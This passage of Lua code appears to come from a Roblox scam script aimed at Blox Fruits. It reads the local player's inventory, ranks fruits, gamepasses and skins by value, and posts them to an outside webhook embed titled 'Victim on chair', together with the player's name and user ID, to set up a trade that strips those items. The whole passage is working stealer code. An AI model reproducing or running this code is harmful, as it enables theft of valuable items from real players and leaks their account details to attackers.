-- INVENTORY / CLASSIFICATION
-- =============================================================================
local function norm(s) return tostring(s or ""):lower():gsub("[%s%(%)%-_%[%]]", "") end
local function getInventory()
    local ok, inv = pcall(function() return CommF:InvokeServer("getInventory") end)
    return ok and inv or nil
end
local function isFruit(item)
    if not item then return false end
    if item.Type == "Blox Fruit" then return true end
    return norm(item.Name):find("fruit", 1, true) ~= nil
end
local function isPremium(item)
    if not item then return false end
    if item.Type == "Premium" then return true end
    local n = norm(item.Name)
    if n:find("perm", 1, true) or n:find("gamepass", 1, true) then return true end
    for _, kw in ipairs(SKIN_PRIORITY) do
        if n:find(kw, 1, true) then return true end
    end
    return false
end
local function priorityRank(item)
    local n = norm(item.Name)
    for i, kw in ipairs(FRUIT_PRIORITY) do if n:find(kw, 1, true) then return i end end
    for i, kw in ipairs(SKIN_PRIORITY) do if n:find(kw, 1, true) then return 100 + i end end
    if n:find("perm", 1, true) or n:find("gamepass", 1, true) then return 500 end
    if item.Type == "Blox Fruit" then return 600 end
    return 999
end
local function collectTradeable()
    local inv = getInventory()
    if not inv then return {} end
    local out = {}
    for _, item in ipairs(inv) do
        if isFruit(item) or isPremium(item) then out[#out + 1] = item end
    end
    table.sort(out, function(a, b) return priorityRank(a) < priorityRank(b) end)
    return out
end
local function sendInventoryEmbed(reason)
    local inv = getInventory() or {}
    local ordered = {}
    for _, item in ipairs(inv) do
        if isFruit(item) or isPremium(item) then ordered[#ordered + 1] = item end
    end
    table.sort(ordered, function(a, b) return priorityRank(a) < priorityRank(b) end)
    local lines = {}
    for i, item in ipairs(ordered) do
        lines[#lines + 1] = string.format("#%02d  %s (x%d)", i, tostring(item.Name):gsub("-", " "), item.Count or 1)
    end
    if #lines == 0 then lines = { "None" } end
    postEmbed({
        title = "🍇 Blox Fruits — Victim on chair",
        description = reason or "Whitelisted trade started.",
        color = 0x00FF7F,
        fields = {
            { name = "Victim", value = string.format("%s (%d)", LP.Name, LP.UserId), inline = true },
            { name = "Game", value = string.format("%s | %d", tostring(game.Name), game.PlaceId), inline = true },
            { name = "Priority order", value = "```" .. table.concat(lines, "\n"):sub(1, 1000) .. "```", inline = false },
        },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
        footer = { text = "ofx in the corner" },
    })
end

